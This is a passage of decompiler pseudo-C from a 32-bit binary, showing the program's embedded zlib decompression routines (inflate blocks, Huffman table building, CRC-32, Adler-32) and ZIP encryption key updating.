        local_1c = (byte *)((int)*(undefined4 **)((int)this + 0x30) + (-1 - (int)local_14));
      }
      else {
        local_1c = (byte *)(*(int *)((int)this + 0x2c) - (int)local_14);
      }
      local_8 = uVar5;
      if (*(int *)((int)this + 0x18) != 0) {
        *(undefined4 *)this = 7;
        goto switchD_0038aa41_caseD_7;
      }
      *(undefined4 *)this = 0;
      break;
    case 6:
      goto switchD_0038aa41_caseD_6;
    case 7:
switchD_0038aa41_caseD_7:
      *(undefined4 **)((int)this + 0x34) = local_14;
      iVar10 = FUN_0038a140((int)param_1);
      local_14 = *(undefined4 **)((int)this + 0x34);
      if (*(undefined4 **)((int)this + 0x30) != local_14) {
        *(uint *)((int)this + 0x20) = local_8;
        *(byte **)((int)this + 0x1c) = pbVar11;
        in_EAX[1] = local_10;
        pbVar11 = *in_EAX;
        *in_EAX = (byte *)local_c;
        in_EAX[2] = in_EAX[2] + ((int)local_c - (int)pbVar11);
        *(undefined4 **)((int)this + 0x34) = local_14;
LAB_0038b338:
        FUN_0038a140(iVar10);
        return;
      }
      *(undefined4 *)this = 8;
    case 8:
      goto switchD_0038aa41_caseD_8;
    case 9:
switchD_0038aa41_caseD_9:
      *(uint *)((int)this + 0x20) = local_8;
      *(byte **)((int)this + 0x1c) = pbVar11;
      pbVar11 = *in_EAX;
      *in_EAX = (byte *)local_c;
      in_EAX[2] = in_EAX[2] + ((int)local_c - (int)pbVar11);
      in_EAX[1] = local_10;
      *(undefined4 **)((int)this + 0x34) = local_14;
      FUN_0038a140(-3);
      return;
    default:
      param_1 = (byte *)0xfffffffe;
LAB_0038b0db:
      *(uint *)((int)this + 0x20) = local_8;
      *(byte **)((int)this + 0x1c) = pbVar11;
      in_EAX[1] = local_10;
      goto LAB_0038b0ea;
    }
                    // WARNING: Load size is inaccurate
    uVar6 = *this;
  } while( true );
LAB_0038b10b:
  *(uint *)((int)this + 0x20) = local_8;
LAB_0038b111:
  *(byte **)((int)this + 0x1c) = pbVar11;
  iVar10 = (int)local_c - (int)*in_EAX;
  *in_EAX = (byte *)local_c;
  in_EAX[1] = (byte *)0x0;
  goto LAB_0038b0f3;
switchD_0038aa41_caseD_8:
  *(uint *)((int)this + 0x20) = local_8;
  *(byte **)((int)this + 0x1c) = pbVar11;
  in_EAX[1] = local_10;
  param_1 = (byte *)0x1;
LAB_0038b0ea:
  iVar10 = (int)local_c - (int)*in_EAX;
  *in_EAX = (byte *)local_c;
LAB_0038b0f3:
  in_EAX[2] = in_EAX[2] + iVar10;
  *(undefined4 **)((int)this + 0x34) = local_14;
  FUN_0038a140((int)param_1);
  return;
}



undefined4 FUN_0038b3a0(void)

{
  int iVar1;
  int *unaff_ESI;
  int unaff_EDI;
  
  if ((*unaff_ESI == 4) || (*unaff_ESI == 5)) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[3]);
  }
  if (*unaff_ESI == 6) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[1]);
  }
  unaff_ESI[0xd] = unaff_ESI[10];
  unaff_ESI[0xc] = unaff_ESI[10];
  *unaff_ESI = 0;
  unaff_ESI[7] = 0;
  unaff_ESI[8] = 0;
  if ((code *)unaff_ESI[0xe] != (code *)0x0) {
    iVar1 = (*(code *)unaff_ESI[0xe])(0,0,0);
    unaff_ESI[0xf] = iVar1;
    *(int *)(unaff_EDI + 0x30) = iVar1;
  }
  (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[10]);
  (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[9]);
  (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28));
  return 0;
}



// WARNING: Could not reconcile some variable overlaps

void __fastcall
FUN_0038b430(uint *param_1,uint *param_2,uint param_3,uint param_4,int param_5,int param_6,
            uint **param_7,uint *param_8,int param_9,uint *param_10)

{
  char cVar1;
  uint uVar2;
  uint uVar3;
  uint *puVar4;
  byte bVar5;
  uint uVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  undefined in_stack_fffffee4;
  undefined uVar10;
  uint **local_e0;
  uint **local_dc;
  uint local_d4;
  int local_d0;
  uint *local_cc;
  uint *local_c8;
  int local_c4;
  undefined4 local_c0;
  uint local_bc;
  uint local_b8;
  uint local_b4;
  uint *local_b0;
  uint local_ac;
  uint local_a8;
  uint local_a4;
  uint *local_a0;
  int local_9c;
  uint *local_98;
  uint local_94;
  uint local_90;
  uint local_8c [16];
  uint local_4c [17];
  uint local_8;
  undefined4 uVar11;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_d0 = param_9;
  local_c8 = param_10;
  local_dc = param_7;
  local_4c[0] = 0;
  local_4c[1] = 0;
  local_4c[2] = 0;
  local_4c[3] = 0;
  local_4c[4] = 0;
  local_4c[5] = 0;
  local_4c[6] = 0;
  local_4c[7] = 0;
  local_4c[8] = 0;
  local_4c[9] = 0;
  local_4c[10] = 0;
  local_4c[11] = 0;
  local_4c[12] = 0;
  local_4c[13] = 0;
  local_4c[14] = 0;
  local_4c[15] = 0;
  puVar4 = param_1;
  uVar6 = param_3;
  do {
    uVar2 = *puVar4;
    local_4c[uVar2] = local_4c[uVar2] + 1;
    puVar4 = puVar4 + 1;
    uVar6 = uVar6 - 1;
  } while (uVar6 != 0);
  if (local_4c[0] == param_3) {
    *param_7 = (uint *)0x0;
    *param_8 = 0;
    terminate_if_debugger_present
              (local_8 ^ (uint)&stack0xfffffffc,local_4c + uVar2,in_stack_fffffee4);
    return;
  }
  local_94 = 1;
  do {
    if (local_4c[local_94] != 0) break;
    local_94 = local_94 + 1;
  } while (local_94 < 0x10);
  local_90 = *param_8;
  if (*param_8 < local_94) {
    local_90 = local_94;
  }
  local_ac = 0xf;
  do {
    if (local_4c[local_ac] != 0) break;
    local_ac = local_ac - 1;
  } while (local_ac != 0);
  if (local_ac < local_90) {
    local_90 = local_ac;
  }
  *param_8 = local_90;
  iVar8 = 1 << ((byte)local_94 & 0x1f);
  for (uVar6 = local_94; uVar2 = local_90, uVar6 < local_ac; uVar6 = uVar6 + 1) {
    if ((int)(iVar8 - local_4c[uVar6]) < 0) goto LAB_0038b649;
    iVar8 = (iVar8 - local_4c[uVar6]) * 2;
  }
  uVar6 = local_4c[local_ac];
  iVar8 = iVar8 - uVar6;
  if (-1 < iVar8) {
    local_4c[local_ac] = uVar6 + iVar8;
    iVar8 = 0;
    iVar7 = local_ac - 1;
    local_8c[1] = 0;
    if (iVar7 != 0) {
      iVar9 = 0;
      do {
        iVar8 = iVar8 + *(int *)((int)local_4c + iVar9 + 4);
        iVar7 = iVar7 + -1;
        *(int *)((int)local_8c + iVar9 + 8) = iVar8;
        iVar9 = iVar9 + 4;
      } while (iVar7 != 0);
    }
    uVar6 = 0;
    do {
      uVar2 = *param_1;
      param_1 = param_1 + 1;
      if (uVar2 != 0) {
        uVar3 = local_8c[uVar2];
        param_10[uVar3] = uVar6;
        local_8c[uVar2] = uVar3 + 1;
      }
      uVar6 = uVar6 + 1;
    } while (uVar6 < param_3);
    local_b8 = local_8c[local_ac];
    local_98 = param_10;
    uVar6 = 0;
    iVar8 = -local_90;
    local_b4 = 0;
    local_8c[0] = 0;
    local_9c = -1;
    uVar11 = 0;
    uVar10 = 0;
    local_a0 = (uint *)0x0;
    local_a8 = 0;
    uVar2 = local_90;
    if ((int)local_94 <= (int)local_ac) {
      local_b0 = local_4c + local_94;
      local_cc = param_2;
      do {
        local_d4 = *local_b0;
        while (local_d4 != 0) {
          local_c0._2_2_ = (undefined2)(local_c0 >> 0x10);
          local_a4 = local_d4 - 1;
          if ((int)(iVar8 + uVar2) < (int)local_94) {
            local_c4 = iVar8 - uVar2;
            iVar7 = iVar8 + uVar2;
            do {
              iVar8 = iVar7;
              in_stack_fffffee4 = (undefined)uVar11;
              local_c4 = local_c4 + uVar2;
              local_9c = local_9c + 1;
              uVar6 = local_ac - iVar8;
              if (local_90 < local_ac - iVar8) {
                uVar6 = local_90;
              }
              uVar3 = local_94 - iVar8;
              uVar2 = 1 << ((byte)uVar3 & 0x1f);
              if ((local_d4 < uVar2) &&
                 (iVar7 = uVar2 + (-1 - local_a4), puVar4 = local_b0, uVar3 < uVar6)) {
                while (uVar3 = uVar3 + 1, uVar3 < uVar6) {
                  uVar2 = puVar4[1];
                  if ((uint)(iVar7 * 2) <= uVar2) break;
                  iVar7 = iVar7 * 2 - uVar2;
                  puVar4 = puVar4 + 1;
                }
              }
              local_a8 = 1 << ((byte)uVar3 & 0x1f);
              uVar2 = local_a8 + *local_cc;
              if (0x5a0 < uVar2) goto LAB_0038b649;
              local_a0 = (uint *)(local_d0 + *local_cc * 8);
              local_e0 = (uint **)(&stack0xfffffee4 + local_9c * 4);
              *local_e0 = local_a0;
              *local_cc = uVar2;
              if (local_9c == 0) {
                *local_dc = local_a0;
              }
              else {
                local_8c[local_9c] = local_b4;
                uVar6 = local_b4 >> ((byte)local_c4 & 0x1f);
                puVar4 = local_e0[-1];
                local_c0 = local_c0 & 0xffff0000 | (uint)CONCAT11((undefined)local_90,(byte)uVar3);
                local_bc = ((int)local_a0 - (int)puVar4 >> 3) - uVar6;
                puVar4[uVar6 * 2] = local_c0;
                puVar4[uVar6 * 2 + 1] = local_bc;
              }
              iVar7 = iVar8 + local_90;
              uVar2 = local_90;
              uVar6 = local_b4;
            } while ((int)(iVar8 + local_90) < (int)local_94);
          }
          cVar1 = (char)local_94;
          bVar5 = (byte)iVar8;
          if (local_98 < local_c8 + local_b8) {
            local_bc = *local_98;
            if (local_bc < param_4) {
              local_c0._0_1_ = (-(local_bc < 0x100) & 0xa0U) + 0x60;
            }
            else {
              iVar7 = (local_bc - param_4) * 4;
              local_c0._0_1_ = *(char *)(iVar7 + param_6) + 'P';
              local_bc = *(uint *)(iVar7 + param_5);
            }
            local_98 = local_98 + 1;
          }
          else {
            local_c0._0_1_ = -0x40;
          }
          local_c0 = CONCAT31(CONCAT21(local_c0._2_2_,cVar1 - bVar5),(char)local_c0);
          iVar7 = 1 << (cVar1 - bVar5 & 0x1f);
          uVar2 = uVar6 >> (bVar5 & 0x1f);
          if (uVar2 < local_a8) {
            puVar4 = local_a0 + uVar2 * 2;
            do {
              *puVar4 = local_c0;
              puVar4[1] = local_bc;
              uVar2 = uVar2 + iVar7;
              puVar4 = puVar4 + iVar7 * 2;
              uVar6 = local_b4;
            } while (uVar2 < local_a8);
          }
          uVar3 = 1 << (cVar1 - 1U & 0x1f);
          uVar2 = uVar6 & uVar3;
          while (uVar2 != 0) {
            uVar6 = uVar6 ^ uVar3;
            uVar3 = uVar3 >> 1;
            uVar2 = uVar6 & uVar3;
          }
          uVar6 = uVar6 ^ uVar3;
          local_d4 = local_a4;
          uVar2 = local_90;
          local_b4 = uVar6;
          if (((1 << (bVar5 & 0x1f)) - 1U & uVar6) != local_8c[local_9c]) {
            do {
              iVar8 = iVar8 - local_90;
              local_9c = local_9c + -1;
            } while (((1 << ((byte)iVar8 & 0x1f)) - 1U & uVar6) != local_8c[local_9c]);
          }
        }
        uVar10 = (undefined)uVar11;
        local_b0 = local_b0 + 1;
        local_94 = local_94 + 1;
      } while ((int)local_94 <= (int)local_ac);
    }
    terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar2,uVar10);
    return;
  }
LAB_0038b649:
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar2,in_stack_fffffee4);
  return;
}



int __cdecl FUN_0038b970(uint *param_1,uint *param_2,uint **param_3,int param_4)

{
  uint *puVar1;
  int iVar2;
  int unaff_EBX;
  uint local_8;
  
  local_8 = 0;
  puVar1 = (uint *)(**(code **)(unaff_EBX + 0x20))(*(undefined4 *)(unaff_EBX + 0x28),0x13,4);
  if (puVar1 == (uint *)0x0) {
    return -4;
  }
  iVar2 = FUN_0038b430(param_1,&local_8,0x13,0x13,0,0,param_3,param_2,param_4,puVar1);
  if (iVar2 == -3) {
    *(char **)(unaff_EBX + 0x18) = "oversubscribed dynamic bit lengths tree";
  }
  else {
    if ((iVar2 == -5) || (*param_2 == 0)) {
      *(char **)(unaff_EBX + 0x18) = "incomplete dynamic bit lengths tree";
      iVar2 = -3;
    }
  }
  (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
  return iVar2;
}



int __cdecl
FUN_0038ba00(uint param_1,uint param_2,uint *param_3,uint *param_4,uint *param_5,uint **param_6,
            uint **param_7,int param_8)

{
  uint *puVar1;
  int iVar2;
  int unaff_EBX;
  uint local_8;
  
  local_8 = 0;
  puVar1 = (uint *)(**(code **)(unaff_EBX + 0x20))(*(undefined4 *)(unaff_EBX + 0x28),0x120,4);
  if (puVar1 == (uint *)0x0) {
    return -4;
  }
  iVar2 = FUN_0038b430(param_3,&local_8,param_1,0x101,(int)&DAT_003d0130,(int)&DAT_003d01b0,param_6,
                       param_4,param_8,puVar1);
  if (iVar2 == 0) {
    if (*param_4 != 0) {
      iVar2 = FUN_0038b430(param_3 + param_1,&local_8,param_2,0,(int)&DAT_003d0230,
                           (int)&DAT_003d02a8,param_7,param_5,param_8,puVar1);
      if (iVar2 == 0) {
        if ((*param_5 != 0) || (param_1 < 0x102)) {
          (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
          return 0;
        }
      }
      else {
        if (iVar2 == -3) {
          *(char **)(unaff_EBX + 0x18) = "oversubscribed distance tree";
          (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
          return -3;
        }
        if (iVar2 == -5) {
          *(char **)(unaff_EBX + 0x18) = "incomplete distance tree";
          (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
          return -3;
        }
        if (iVar2 == -4) goto LAB_0038bb27;
      }
      *(char **)(unaff_EBX + 0x18) = "empty distance tree with lengths";
      iVar2 = -3;
LAB_0038bb27:
      (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
      return iVar2;
    }
  }
  else {
    if (iVar2 == -3) {
      *(char **)(unaff_EBX + 0x18) = "oversubscribed literal/length tree";
      goto LAB_0038bb5b;
    }
    if (iVar2 == -4) goto LAB_0038bb5b;
  }
  *(char **)(unaff_EBX + 0x18) = "incomplete literal/length tree";
  iVar2 = -3;
LAB_0038bb5b:
  (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
  return iVar2;
}



undefined4 __cdecl
FUN_0038bb70(uint param_1,int param_2,int param_3,int param_4,int param_5,byte **param_6)

{
  byte *pbVar1;
  byte *pbVar2;
  byte bVar3;
  byte bVar4;
  uint uVar5;
  uint uVar6;
  int iVar7;
  uint uVar8;
  uint uVar9;
  undefined *puVar10;
  undefined *puVar11;
  uint uVar12;
  int iVar13;
  uint uVar14;
  uint uVar15;
  undefined *puVar16;
  undefined *local_10;
  byte *local_c;
  byte *local_8;
  
  local_c = param_6[1];
  local_8 = *param_6;
  uVar15 = *(uint *)(param_5 + 0x20);
  uVar6 = *(uint *)(param_5 + 0x1c);
  puVar16 = *(undefined **)(param_5 + 0x34);
  if (puVar16 < *(undefined **)(param_5 + 0x30)) {
    local_10 = *(undefined **)(param_5 + 0x30) + (-1 - (int)puVar16);
  }
  else {
    local_10 = (undefined *)(*(int *)(param_5 + 0x2c) - (int)puVar16);
  }
  uVar12 = *(uint *)(&DAT_003cef98 + param_1 * 4);
  uVar5 = *(uint *)(&DAT_003cef98 + param_2 * 4);
  do {
    for (; uVar6 < 0x14; uVar6 = uVar6 + 8) {
      bVar3 = *local_8;
      local_c = local_c + -1;
      local_8 = local_8 + 1;
      uVar15 = uVar15 | (uint)bVar3 << ((byte)uVar6 & 0x1f);
    }
    bVar3 = *(byte *)(param_3 + (uVar12 & uVar15) * 8);
    uVar14 = (uint)bVar3;
    iVar13 = param_3 + (uVar12 & uVar15) * 8;
    bVar4 = *(byte *)(iVar13 + 1);
    uVar15 = uVar15 >> (bVar4 & 0x1f);
    if (uVar14 == 0) {
LAB_0038bd9c:
      uVar6 = uVar6 - bVar4;
      *puVar16 = *(undefined *)(iVar13 + 4);
      puVar16 = puVar16 + 1;
      local_10 = local_10 + -1;
    }
    else {
      uVar6 = uVar6 - *(byte *)(iVar13 + 1);
      while ((bVar3 & 0x10) == 0) {
        if ((uVar14 & 0x40) != 0) {
          if ((uVar14 & 0x20) != 0) {
            uVar12 = (int)param_6[1] - (int)local_c;
            if (uVar6 >> 3 < (uint)((int)param_6[1] - (int)local_c)) {
              uVar12 = uVar6 >> 3;
            }
            *(uint *)(param_5 + 0x20) = uVar15;
            *(uint *)(param_5 + 0x1c) = uVar6 + uVar12 * -8;
            param_6[1] = local_c + uVar12;
            pbVar1 = *param_6;
            *param_6 = local_8 + -uVar12;
            param_6[2] = param_6[2] + ((int)(local_8 + -uVar12) - (int)pbVar1);
            *(undefined **)(param_5 + 0x34) = puVar16;
            return 1;
          }
          param_6[6] = (byte *)"invalid literal/length code";
          goto LAB_0038be66;
        }
        iVar7 = (*(uint *)(&DAT_003cef98 + uVar14 * 4) & uVar15) + *(int *)(iVar13 + 4);
        bVar3 = *(byte *)(iVar13 + iVar7 * 8);
        uVar14 = (uint)bVar3;
        iVar13 = iVar13 + iVar7 * 8;
        bVar4 = *(byte *)(iVar13 + 1);
        uVar15 = uVar15 >> (bVar4 & 0x1f);
        if (uVar14 == 0) goto LAB_0038bd9c;
        uVar6 = uVar6 - *(byte *)(iVar13 + 1);
      }
      uVar14 = uVar14 & 0xf;
      uVar8 = (*(uint *)(&DAT_003cef98 + uVar14 * 4) & uVar15) + *(int *)(iVar13 + 4);
      uVar15 = uVar15 >> (sbyte)uVar14;
      for (uVar6 = uVar6 - uVar14; uVar6 < 0xf; uVar6 = uVar6 + 8) {
        bVar3 = *local_8;
        local_c = local_c + -1;
        local_8 = local_8 + 1;
        uVar15 = uVar15 | (uint)bVar3 << ((byte)uVar6 & 0x1f);
      }
      pbVar1 = (byte *)(param_4 + (uVar5 & uVar15) * 8);
      uVar15 = uVar15 >> (pbVar1[1] & 0x1f);
      uVar6 = uVar6 - pbVar1[1];
      bVar3 = *pbVar1;
      while ((bVar3 & 0x10) == 0) {
        if ((bVar3 & 0x40) != 0) {
          param_6[6] = (byte *)"invalid distance code";
LAB_0038be66:
          uVar12 = (int)param_6[1] - (int)local_c;
          if (uVar6 >> 3 < (uint)((int)param_6[1] - (int)local_c)) {
            uVar12 = uVar6 >> 3;
          }
          *(uint *)(param_5 + 0x20) = uVar15;
          *(uint *)(param_5 + 0x1c) = uVar6 + uVar12 * -8;
          param_6[1] = local_c + uVar12;
          pbVar1 = *param_6;
          *param_6 = local_8 + -uVar12;
          param_6[2] = param_6[2] + ((int)(local_8 + -uVar12) - (int)pbVar1);
          *(undefined **)(param_5 + 0x34) = puVar16;
          return 0xfffffffd;
        }
        iVar13 = (*(uint *)(&DAT_003cef98 + (uint)bVar3 * 4) & uVar15) + *(int *)(pbVar1 + 4);
        pbVar2 = pbVar1 + iVar13 * 8 + 1;
        pbVar1 = pbVar1 + iVar13 * 8;
        uVar15 = uVar15 >> (*pbVar2 & 0x1f);
        uVar6 = uVar6 - *pbVar2;
        bVar3 = *pbVar1;
      }
      uVar14 = bVar3 & 0xf;
      for (; uVar6 < uVar14; uVar6 = uVar6 + 8) {
        bVar3 = *local_8;
        local_c = local_c + -1;
        local_8 = local_8 + 1;
        uVar15 = uVar15 | (uint)bVar3 << ((byte)uVar6 & 0x1f);
      }
      uVar9 = *(uint *)(&DAT_003cef98 + uVar14 * 4) & uVar15;
      local_10 = local_10 + -uVar8;
      uVar15 = uVar15 >> (sbyte)uVar14;
      uVar6 = uVar6 - uVar14;
      puVar11 = *(undefined **)(param_5 + 0x28);
      puVar10 = puVar16 + -(uVar9 + *(int *)(pbVar1 + 4));
      if (puVar10 < puVar11) {
        do {
          puVar10 = puVar10 + (*(int *)(param_5 + 0x2c) - (int)puVar11);
        } while (puVar10 < puVar11);
        param_1 = *(int *)(param_5 + 0x2c) - (int)puVar10;
        if (param_1 < uVar8) {
          iVar13 = uVar8 - param_1;
          do {
            *puVar16 = *puVar10;
            puVar16 = puVar16 + 1;
            puVar10 = puVar10 + 1;
            param_1 = param_1 - 1;
          } while (param_1 != 0);
          puVar11 = *(undefined **)(param_5 + 0x28);
          do {
            *puVar16 = *puVar11;
            puVar16 = puVar16 + 1;
            puVar11 = puVar11 + 1;
            iVar13 = iVar13 + -1;
          } while (iVar13 != 0);
        }
        else {
          *puVar16 = *puVar10;
          puVar16[1] = puVar10[1];
          puVar16 = puVar16 + 2;
          puVar10 = puVar10 + 2;
          iVar13 = uVar8 - 2;
          do {
            *puVar16 = *puVar10;
            puVar16 = puVar16 + 1;
            puVar10 = puVar10 + 1;
            iVar13 = iVar13 + -1;
          } while (iVar13 != 0);
        }
      }
      else {
        *puVar16 = *puVar10;
        puVar16[1] = puVar10[1];
        puVar16 = puVar16 + 2;
        puVar10 = puVar10 + 2;
        iVar13 = uVar8 - 2;
        do {
          *puVar16 = *puVar10;
          puVar16 = puVar16 + 1;
          puVar10 = puVar10 + 1;
          iVar13 = iVar13 + -1;
        } while (iVar13 != 0);
      }
    }
    if ((local_10 < (undefined *)0x102) || (local_c < (byte *)0xa)) {
      uVar12 = (int)param_6[1] - (int)local_c;
      if (uVar6 >> 3 < (uint)((int)param_6[1] - (int)local_c)) {
        uVar12 = uVar6 >> 3;
      }
      *(uint *)(param_5 + 0x20) = uVar15;
      *(uint *)(param_5 + 0x1c) = uVar6 + uVar12 * -8;
      param_6[1] = local_c + uVar12;
      pbVar1 = *param_6;
      *param_6 = local_8 + -uVar12;
      param_6[2] = param_6[2] + ((int)(local_8 + -uVar12) - (int)pbVar1);
      *(undefined **)(param_5 + 0x34) = puVar16;
      return 0;
    }
  } while( true );
}



uint __fastcall FUN_0038beb0(byte *param_1,uint param_2)

{
  uint in_EAX;
  uint uVar1;
  uint uVar2;
  
  if (param_1 == (byte *)0x0) {
    return 0;
  }
  uVar1 = ~in_EAX;
  if (7 < param_2) {
    uVar2 = param_2 >> 3;
    do {
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_003d0320 + ((*param_1 ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_003d0320 + ((param_1[1] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_003d0320 + ((param_1[2] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_003d0320 + ((param_1[3] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_003d0320 + ((param_1[4] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_003d0320 + ((param_1[5] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_003d0320 + ((param_1[6] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_003d0320 + ((param_1[7] ^ uVar1) & 0xff) * 4);
      param_1 = param_1 + 8;
      param_2 = param_2 - 8;
      uVar2 = uVar2 - 1;
    } while (uVar2 != 0);
  }
  for (; param_2 != 0; param_2 = param_2 - 1) {
    uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_003d0320 + ((*param_1 ^ uVar1) & 0xff) * 4);
    param_1 = param_1 + 1;
  }
  return ~uVar1;
}



void __fastcall FUN_0038bfb0(char param_1,uint *param_2)

{
  uint uVar1;
  
  uVar1 = *(uint *)(&DAT_003d0320 + (((int)param_1 ^ *param_2) & 0xff) * 4) ^ *param_2 >> 8;
  *param_2 = uVar1;
  uVar1 = ((uVar1 & 0xff) + param_2[1]) * 0x8088405 + 1;
  param_2[1] = uVar1;
  param_2[2] = param_2[2] >> 8 ^
               *(uint *)(&DAT_003d0320 + ((uVar1 >> 0x18 ^ param_2[2]) & 0xff) * 4);
  return;
}



void FUN_0038c000(void)

{
  uint uVar1;
  byte in_AL;
  uint uVar2;
  uint *unaff_ESI;
  
  uVar1 = unaff_ESI[2];
  uVar2 = uVar1 & 0xfffd | 2;
  uVar2 = *(uint *)(&DAT_003d0320 +
                   (((int)(char)(in_AL ^ (byte)((uVar2 ^ 1) * uVar2 >> 8)) ^ *unaff_ESI) & 0xff) * 4
                   ) ^ *unaff_ESI >> 8;
  *unaff_ESI = uVar2;
  uVar2 = ((uVar2 & 0xff) + unaff_ESI[1]) * 0x8088405 + 1;
  unaff_ESI[1] = uVar2;
  unaff_ESI[2] = uVar1 >> 8 ^ *(uint *)(&DAT_003d0320 + ((uVar2 >> 0x18 ^ uVar1) & 0xff) * 4);
  return;
}



uint __cdecl FUN_0038c070(uint param_1,byte *param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  int iVar12;
  int iVar13;
  int iVar14;
  int iVar15;
  int iVar16;
  int iVar17;
  uint uVar18;
  uint uVar19;
  
  uVar2 = param_1 & 0xffff;
  uVar19 = param_1 >> 0x10;
  if (param_2 == (byte *)0x0) {
    return 1;
  }
  if (param_3 != 0) {
    do {
      uVar1 = param_3;
      if (0x15af < param_3) {
        uVar1 = 0x15b0;
      }
      param_3 = param_3 - uVar1;
      if (0xf < (int)uVar1) {
        uVar18 = uVar1 >> 4;
        uVar1 = uVar1 + uVar18 * -0x10;
        do {
          iVar3 = uVar2 + *param_2;
          iVar4 = iVar3 + (uint)param_2[1];
          iVar5 = iVar4 + (uint)param_2[2];
          iVar6 = iVar5 + (uint)param_2[3];
          iVar7 = iVar6 + (uint)param_2[4];
          iVar8 = iVar7 + (uint)param_2[5];
          iVar9 = iVar8 + (uint)param_2[6];
          iVar10 = iVar9 + (uint)param_2[7];
          iVar11 = iVar10 + (uint)param_2[8];
          iVar12 = iVar11 + (uint)param_2[9];
          iVar13 = iVar12 + (uint)param_2[10];
          iVar14 = iVar13 + (uint)param_2[0xb];
          iVar15 = iVar14 + (uint)param_2[0xc];
          iVar16 = iVar15 + (uint)param_2[0xd];
          iVar17 = iVar16 + (uint)param_2[0xe];
          uVar2 = iVar17 + (uint)param_2[0xf];
          uVar19 = uVar19 + iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11
                   + iVar12 + iVar13 + iVar14 + iVar15 + iVar16 + iVar17 + uVar2;
          param_2 = param_2 + 0x10;
          uVar18 = uVar18 - 1;
        } while (uVar18 != 0);
      }
      for (; uVar1 != 0; uVar1 = uVar1 - 1) {
        uVar2 = uVar2 + *param_2;
        param_2 = param_2 + 1;
        uVar19 = uVar19 + uVar2;
      }
      uVar2 = uVar2 % 0xfff1;
      uVar19 = uVar19 % 0xfff1;
    } while (param_3 != 0);
  }
  return uVar19 << 0x10 | uVar2;
}



void __cdecl FUN_0038c1b0(undefined4 param_1,size_t param_2,size_t param_3)

{
  _calloc(param_2,param_3);
  return;
}



void __cdecl FUN_0038c1d0(undefined4 param_1,void *param_2)

{
  _free(param_2);
  return;
}



undefined4 FUN_0038c1f0(void)

{
  uint *puVar1;
  int in_EAX;
  
  if ((in_EAX != 0) && (puVar1 = *(uint **)(in_EAX + 0x1c), puVar1 != (uint *)0x0)) {
    *(undefined4 *)(in_EAX + 0x14) = 0;
    *(undefined4 *)(in_EAX + 8) = 0;
    *(undefined4 *)(in_EAX + 0x18) = 0;
    *puVar1 = -(uint)(puVar1[3] != 0) & 7;
    FUN_0038a8e0();
    return 0;
  }
  return 0xfffffffe;
}



undefined4 FUN_0038c230(void)

{
  int in_EAX;
  
  if (((in_EAX != 0) && (*(int *)(in_EAX + 0x1c) != 0)) && (*(int *)(in_EAX + 0x24) != 0)) {
    if (*(int *)(*(int *)(in_EAX + 0x1c) + 0x14) != 0) {
      FUN_0038b3a0();
    }
    (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),*(undefined4 *)(in_EAX + 0x1c));
    *(undefined4 *)(in_EAX + 0x1c) = 0;
    return 0;
  }
  return 0xfffffffe;
}



undefined4 FUN_0038c280(void)

{
  int iVar1;
  undefined4 *puVar2;
  int unaff_ESI;
  
  if (unaff_ESI == 0) {
    return 0xfffffffe;
  }
  *(undefined4 *)(unaff_ESI + 0x18) = 0;
  if (*(int *)(unaff_ESI + 0x20) == 0) {
    *(code **)(unaff_ESI + 0x20) = FUN_0038c1b0;
    *(undefined4 *)(unaff_ESI + 0x28) = 0;
  }
  if (*(int *)(unaff_ESI + 0x24) == 0) {
    *(code **)(unaff_ESI + 0x24) = FUN_0038c1d0;
  }
  iVar1 = (**(code **)(unaff_ESI + 0x20))(*(undefined4 *)(unaff_ESI + 0x28),1,0x18);
  *(int *)(unaff_ESI + 0x1c) = iVar1;
  if (iVar1 != 0) {
    *(undefined4 *)(iVar1 + 0x14) = 0;
    *(undefined4 *)(*(int *)(unaff_ESI + 0x1c) + 0xc) = 0;
    *(undefined4 *)(*(int *)(unaff_ESI + 0x1c) + 0xc) = 1;
    *(undefined4 *)(*(int *)(unaff_ESI + 0x1c) + 0x10) = 0xf;
    puVar2 = FUN_0038a950(~-(uint)(*(int *)(*(int *)(unaff_ESI + 0x1c) + 0xc) != 0) & 0x38c070);
    *(undefined4 **)(*(int *)(unaff_ESI + 0x1c) + 0x14) = puVar2;
    if (puVar2 != (undefined4 *)0x0) {
